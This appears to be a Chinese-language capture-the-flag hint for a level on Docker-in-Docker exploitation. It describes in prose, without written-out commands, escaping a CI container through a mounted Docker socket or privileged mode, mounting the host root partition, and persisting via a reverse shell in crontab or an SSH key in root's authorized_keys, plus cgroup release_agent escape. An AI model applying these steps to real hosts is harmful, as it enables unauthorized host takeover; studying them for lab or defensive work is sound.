第二关：DIND (docker-in-docker) exploitation

给出提示

在 CI/CD 流水线中，Docker-in-Docker (DinD) 的利用通常围绕着“容器逃逸”展开。利用的核心思路在于：如果容器能够运行 Docker 命令，那么它通常拥有某种形式的高级权限，通过这些权限我们可以反向控制宿主机。
通常有两种主要的利用场景，取决于流水线是如何实现的：

1. 挂载 Docker Socket 的利用 (最常见)

很多所谓的 DinD 其实只是通过卷挂载（Volume Mount）将宿主机的 /var/run/docker.sock 映射到了容器内部。/var/run/docker.sock是Docker守护进程(Docker daemon)默认监听的Unix域套接字(Unix domain socket)，假如被映射到容器内，那么我们就可以跟Docker daemon进行通信，从而执行一些命令。这意味着你在容器里运行的 docker 命令实际上是在宿主机上执行的。

2. 特权模式下的 DinD 利用 (--privileged)

真正的 DinD 需要容器以 --privileged 模式启动。这种模式给了容器几乎所有的内核能力（Capabilities），包括直接访问硬件设备的权力。

利用步骤：

  1. 寻找宿主机磁盘设备： 在特权容器内，你可以看到宿主机的设备文件
  1. 手动挂载设备： 找到宿主机的根分区（通常是 /dev/sda1 或 /dev/vda1），将其挂载到容器内：
  1. 持久化： 通过访问 /mnt/host/etc/crontab 写入反弹 Shell，或者在 /mnt/host/root/.ssh/authorized_keys 写入你的公钥。

3. 常见 payload 汇总

利用 Cgroups (进阶) 使用 release_agent 逃逸（如果内核版本较低且拥有 SYS_ADMIN 权限）
